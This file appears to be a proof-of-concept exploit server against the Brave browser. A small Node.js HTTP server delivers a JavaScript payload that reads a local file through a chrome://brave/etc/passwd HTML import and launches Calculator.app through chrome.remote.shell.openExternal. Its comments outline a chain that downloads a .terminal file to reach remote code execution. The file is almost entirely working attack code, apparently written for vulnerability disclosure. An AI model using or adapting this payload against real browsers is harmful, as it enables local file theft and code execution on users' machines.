const http = require("http")
const port = 80

const payload = `

// Clears HTML file

// Local files reading
let link = document.createElement('link')
link.setAttribute('rel', 'import')
link.setAttribute('as', 'component')
link.setAttribute('href', 'chrome://brave/etc/passwd')
link.onload = () => {
    var file = link.import.querySelector('body')
    alert(file.innerHTML)
}
document.head.appendChild(link);

// Opens 'Calculator.app'
chrome.remote.shell.openExternal('file:///Applications/Calculator.app')
// 1. init download of '.terminal' file via IPC
// 2. open it with the same 'openExternal'
// 3. RCE

setTimeout(() => {
    // webview with Google
    let webview = document.createElement('webview')
    webview.setAttribute('src', 'https://google.com')
    webview.style.width = '600px'
    webview.style.height = '600px'
    document.body.appendChild(webview)
}, 150)

`

const server = http.createServer((req, res) => {
    res.writeHead(200, {
        'Content-Type': 'application/javascript'
    })
    return res.end(payload)
})

server.listen(port, () => {
    console.log(`Running at http://localhost:${port}`)
})
